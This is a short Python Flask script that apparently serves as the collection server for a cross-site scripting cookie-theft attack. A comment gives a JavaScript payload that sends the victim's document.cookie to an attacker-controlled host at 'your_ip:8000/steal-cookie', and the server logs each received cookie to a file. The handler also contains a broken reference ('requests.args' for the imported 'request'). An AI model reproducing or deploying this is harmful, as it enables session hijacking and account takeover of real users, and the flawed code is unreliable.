#!/usr/bin/env python3
# The goal of this is to execute a payload such as (down below) to write cookies
# var img = new Image(); img.src = http://your_ip:8000/steal-cookie?cookie= + document.cookie;

# Setting up a local server to receive cookie data:
from flask import Flask, request

app = Flask(__name__)

# When the user executes the XSS the cookie gets stored
@app.route('/steal-cookie', methods=['GET'])
def steal_cookie():
    cookie = requests.args.get('cookie')
    if cookie:
        with open('cookies.txt', 'a') as f:
            f.write(f'{cookie}\n')
    return 'Cookie received', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
